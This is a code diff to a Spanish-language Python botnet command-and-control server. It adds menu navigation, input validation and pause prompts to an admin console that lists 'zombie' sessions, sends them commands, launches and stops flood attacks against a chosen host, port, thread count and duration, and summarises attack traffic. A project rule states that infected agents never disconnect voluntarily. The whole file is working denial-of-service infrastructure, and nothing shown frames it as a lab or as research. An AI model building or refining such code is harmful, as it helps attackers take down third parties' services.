@@ -15,6 +15,9 @@ Arquitectura
   HEARTBEAT_TIMEOUT segundos -> sesión cerrada por TIMEOUT.
 - Eventos en logs/ (texto + JSONL), métricas por sesión y por objetivo en metrics/.
 - Menú de administración en la consola del servidor.
+- Navegación: dentro de cualquier acción, '0' / 'v' / 'volver' / 'back' / 'q'
+  cancela y regresa al menú principal. Al terminar una acción se espera
+  [Enter] para volver, sin reimprimir el menú encima de la salida.
 
 Regla del proyecto: el agente NO se desconecta voluntariamente. Solo sale
 por caída de red, apagado del equipo, TIMEOUT o kick del administrador.
@@ -54,6 +57,9 @@ CLAVES_ENTERAS = (
     "HEARTBEAT_TIMEOUT", "SOCKET_TIMEOUT", "MONITOR_INTERVAL",
     "VICTIM_PORT", "FLOOD_THREADS", "FLOOD_DURATION",
 )
+
+# Entradas que cancelan la acción en curso y vuelven al menú principal.
+VOLVER = {"0", "v", "volver", "b", "back", "q", "salir", "cancelar"}
 
 
 # ------------------------------------------------------------------ #
@@ -481,18 +487,70 @@ class ServidorBotnet:
     def _activas_locked(self) -> int:
         return sum(1 for s in self.sesiones.values() if s.estado == Estado.CONECTADO)
 
+    # ---------------------------- entrada de consola ---------------------------- #
+
+    def _pedir(self, texto: str) -> Optional[str]:
+        """Lee una entrada obligatoria. None si el usuario pide volver al menú."""
+        try:
+            crudo = input(texto).strip()
+        except (EOFError, KeyboardInterrupt):
+            print()
+            return None
+        if not crudo or crudo.lower() in VOLVER:
+            return None
+        return crudo
+
+    def _pedir_texto(self, texto: str, defecto: str = "") -> Optional[str]:
+        """Como _pedir, pero una entrada vacía toma el valor por defecto."""
+        try:
+            crudo = input(texto).strip()
+        except (EOFError, KeyboardInterrupt):
+            print()
+            return None
+        if crudo.lower() in VOLVER:
+            return None
+        return crudo or defecto
+
+    def _pedir_numero(self, texto: str, defecto: int, minimo: int, maximo: int) -> Optional[int]:
+        """Número validado. None si el usuario pide volver; vacío = defecto."""
+        while True:
+            try:
+                crudo = input("{} [{}]: ".format(texto, defecto)).strip()
+            except (EOFError, KeyboardInterrupt):
+                print()
+                return None
+            if crudo.lower() in VOLVER:
+                return None
+            if not crudo:
+                return defecto
+            try:
+                valor = int(crudo)
+            except ValueError:
+                print("  Debe ser un número (0/v = volver).")
+                continue
+            if minimo <= valor <= maximo:
+                return valor
+            print("  Fuera de rango ({}-{}).".format(minimo, maximo))
+
+    def _pausa(self, mensaje: str = "\n[Enter] para volver al menú principal (0/v = volver) "):
+        """Detiene la salida en pantalla hasta que el administrador pulse Enter."""
+        try:
+            input(mensaje)
+        except (EOFError, KeyboardInterrupt):
+            print()
+
     # ---------------------------- menú ---------------------------- #
 
     def _menu(self):
         while self.corriendo:
             print("""
- 1) Listar sesiones            7) Expulsar zombie (kick)
- 2) Detalle de sesión          8) Resumen del ataque en vivo
- 3) Comando a un zombie        9) Ver métricas
- 4) Comando a todos           10) Exportar reporte
- 5) Iniciar inundación        11) Salir
- 6) Detener inundación
-""")
+            1) Listar sesiones            7) Expulsar zombie (kick)
+            2) Detalle de sesión          8) Resumen del ataque en vivo
+            3) Comando a un zombie        9) Ver métricas
+            4) Comando a todos           10) Exportar reporte
+            5) Iniciar inundación        11) Salir
+            6) Detener inundación         0) Volver / cancelar acción
+            """)
             try:
                 opcion = input("admin> ").strip()
             except KeyboardInterrupt:
@@ -527,6 +585,8 @@ class ServidorBotnet:
             elif opcion in ("11", "quit", "exit"):
                 self.detener()
                 break
+            elif opcion in ("0", "v", "volver", "back"):
+                print("Ya estás en el menú principal.")
             else:
                 print("Opción no válida.")
 
@@ -534,26 +594,50 @@ class ServidorBotnet:
         with self.lock:
             if not self.sesiones:
                 print("(sin sesiones)")
+                self._pausa()
                 return
-            cab = "{:<14}{:<18}{:<17}{:<13}{:<20}{:<7}{}".format(
-                "client_id", "hostname", "ip", "estado", "conectado desde", "acks", "flood")
+
+            cab = "{:<20} | {:<22} | {:<17} | {:<13} | {:<20} | {:<7} | {}".format(
+                "client_id",
+                "hostname",
+                "ip",
+                "estado",
+                "conectado desde",
+                "acks",
+                "flood"
+            )
+
             print(cab)
             print("-" * len(cab))
+
             for s in sorted(self.sesiones.values(), key=lambda x: x.conectado_en):
-                print("{:<14}{:<18}{:<17}{:<13}{:<20}{:<7}{}".format(
-                    s.client_id, s.hostname[:17], s.ip, s.estado.value,
-                    s.conectado_en.strftime("%d/%m %H:%M:%S"), s.acks_recibidos,
-                    "SÍ " + s.flood_objetivo if s.inundando else "no"))
+                print("{:<20} | {:<22} | {:<17} | {:<13} | {:<20} | {:<7} | {}".format(
+                    s.client_id,
+                    s.hostname[:22],
+                    s.ip,
+                    s.estado.value,
+                    s.conectado_en.strftime("%d/%m %H:%M:%S"),
+                    s.acks_recibidos,
+                    "SÍ " + s.flood_objetivo if s.inundando else "no"
+                ))
+
             print("-" * len(cab))
             print("Activos: {} | en tabla: {}".format(
-                self._activas_locked(), len(self.sesiones)))
+                self._activas_locked(), len(self.sesiones)
+            ))
+        self._pausa()
 
     def _detalle(self):
-        cid = input("client_id: ").strip()
+        cid = self._pedir("client_id (0 = volver al menú): ")
+        if cid is None:
+            print("Volviendo al menú principal.")
+            return
+
         with self.lock:
             sesion = self.sesiones.get(cid)
             if not sesion:
                 print("No existe esa sesión.")
+                self._pausa()
                 return
             datos = [
                 ("client_id", sesion.client_id),
@@ -573,24 +657,43 @@ class ServidorBotnet:
             ]
         for etiqueta, valor in datos:
             print("{:<18}: {}".format(etiqueta, valor))
+        self._pausa()
 
     def _comando_uno(self):
-        cid = input("client_id: ").strip()
-        cmd = input("comando (PING/INFO/FLOOD/STOP): ").strip().upper()
+        cid = self._pedir("client_id (0 = volver al menú): ")
+        if cid is None:
+            print("Volviendo al menú principal.")
+            return
+
         with self.lock:
             sesion = self.sesiones.get(cid)
         if not sesion or sesion.estado != Estado.CONECTADO:
             print("Sesión no activa.")
+            self._pausa()
             return
+
+        cmd = self._pedir("comando PING/INFO/FLOOD/STOP (0 = volver): ")
+        if cmd is None:
+            print("Comando cancelado. Volviendo al menú principal.")
+            return
+        cmd = cmd.upper()
+
         if self._comando(sesion, cmd, self._payload_flood(cmd)):
             print("Enviado {} a {}".format(cmd, sesion.hostname))
+        self._pausa()
 
     def _comando_todos(self):
-        cmd = input("comando (PING/INFO/STOP): ").strip().upper()
+        cmd = self._pedir("comando PING/INFO/STOP (0 = volver): ")
+        if cmd is None:
+            print("Comando cancelado. Volviendo al menú principal.")
+            return
+        cmd = cmd.upper()
+
         with self.lock:
             activas = [s for s in self.sesiones.values() if s.estado == Estado.CONECTADO]
         enviados = sum(1 for s in activas if self._comando(s, cmd, self._payload_flood(cmd)))
         print("Enviado a {}/{}".format(enviados, len(activas)))
+        self._pausa()
 
     def _payload_flood(self, cmd: str) -> dict:
         if cmd == "FLOOD":
@@ -600,22 +703,27 @@ class ServidorBotnet:
         return {}
 
     def _flood(self):
-        def pedir(texto, defecto, minimo, maximo):
-            while True:
-                crudo = input("{} [{}]: ".format(texto, defecto)).strip() or str(defecto)
-                try:
-                    valor = int(crudo)
-                except ValueError:
-                    print("  Debe ser un número.")
-                    continue
-                if minimo <= valor <= maximo:
-                    return valor
-                print("  Fuera de rango ({}-{}).".format(minimo, maximo))
+        host = self._pedir_texto(
+            "objetivo [{}] (0 = volver): ".format(self.victim_host), self.victim_host)
+        if host is None:
+            print("Inundación cancelada. Volviendo al menú principal.")
+            return
 
-        host = input("objetivo [{}]: ".format(self.victim_host)).strip() or self.victim_host
-        puerto = pedir("puerto", self.victim_port, 1, 65535)
-        hilos = pedir("hilos", self.flood_threads, 1, 500)
-        dur = pedir("duración s", self.flood_duration, 1, 3600)
+        puerto = self._pedir_numero("puerto (0 = volver)", self.victim_port, 1, 65535)
+        if puerto is None:
+            print("Inundación cancelada. Volviendo al menú principal.")
+            return
+
+        hilos = self._pedir_numero("hilos (0 = volver)", self.flood_threads, 1, 500)
+        if hilos is None:
+            print("Inundación cancelada. Volviendo al menú principal.")
+            return
+
+        dur = self._pedir_numero("duración s (0 = volver)", self.flood_duration, 1, 3600)
+        if dur is None:
+            print("Inundación cancelada. Volviendo al menú principal.")
+            return
+
         payload = {"host": host, "port": puerto, "threads": hilos,
                    "duration": dur, "method": self.flood_method}
 
@@ -628,6 +736,7 @@ class ServidorBotnet:
         enviados = sum(1 for s in activas if self._comando(s, "FLOOD", payload))
         self.reg.evento("FLOOD_INICIADO", objetivo=payload, zombies=enviados)
         print("FLOOD {}:{} -> {}/{} zombies".format(host, puerto, enviados, len(activas)))
+        self._pausa()
 
     def _stop_flood(self):
         with self.lock:
@@ -637,24 +746,32 @@ class ServidorBotnet:
         enviados = sum(1 for s in activas if self._comando(s, "STOP"))
         self.reg.evento("FLOOD_DETENIDO", zombies=enviados)
         print("STOP enviado a {}/{} zombies".format(enviados, len(activas)))
+        self._pausa()
 
     def _kick(self):
-        cid = input("client_id: ").strip()
+        cid = self._pedir("client_id (0 = volver al menú): ")
+        if cid is None:
+            print("Volviendo al menú principal.")
+            return
+
         with self.lock:
             sesion = self.sesiones.get(cid)
             if not sesion or sesion.estado != Estado.CONECTADO:
                 print("Sesión no activa.")
+                self._pausa()
                 return
         self._enviar(sesion, {"type": "kick", "reason": "expulsado por el administrador"})
         time.sleep(0.2)
         self._cerrar(sesion, Estado.EXPULSADO, "kick del administrador")
         self.reg.evento("KICK", client_id=cid)
         print("Zombie {} expulsado.".format(cid))
+        self._pausa()
 
     def _resumen_ataque(self):
         with self.lock:
             if not self.ultimo_reporte:
                 print("(sin reportes de ataque todavía)")
+                self._pausa()
                 return
             total = sum(r["enviadas"] for r in self.ultimo_reporte.values())
             errores = sum(r["errores"] for r in self.ultimo_reporte.values())
@@ -668,27 +785,37 @@ class ServidorBotnet:
                     r["bytes"] / 1048576, r["objetivo"]))
             print("-" * 66)
             print("TOTAL: {} solicitudes | {} errores | {:.2f} MB".format(total, errores, mib))
+        self._pausa()
 
     def _ver_metricas(self):
-        cid = input("client_id (vacío = resumen): ").strip()
-        if not cid:
+        cid = self._pedir("client_id (* = resumen, 0 = volver al menú): ")
+        if cid is None:
+            print("Volviendo al menú principal.")
+            return
+
+        if cid in ("*", "todos", "resumen"):
             with self.lock:
                 resumen = [(s.client_id, s.hostname, s.acks_recibidos,
                             s.comandos_enviados, s.reconexiones)
                            for s in self.sesiones.values()]
             if not resumen:
                 print("(sin sesiones)")
+                self._pausa()
                 return
             for cid_s, host, acks, comandos, reconex in resumen:
                 print("{:<14}{:<18} acks={:<4} comandos={:<4} reconex={}".format(
                     cid_s, host, acks, comandos, reconex))
+            self._pausa()
             return
+
         ruta = Path(self.reg.metrics_dir) / "{}.jsonl".format(cid)
         if not ruta.exists():
             print("Sin métricas.")
+            self._pausa()
             return
         for linea in ruta.read_text(encoding="utf-8").splitlines()[-25:]:
             print(linea)
+        self._pausa()
 
     def _exportar(self):
         marca = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -710,6 +837,7 @@ class ServidorBotnet:
         with self.lock, destino_obj.open("w", encoding="utf-8") as fh:
             json.dump(list(self.ultimo_reporte.values()), fh, ensure_ascii=False, indent=2)
         print("Resultados del objetivo: {}".format(destino_obj))
+        self._pausa()
 
 
 def main():
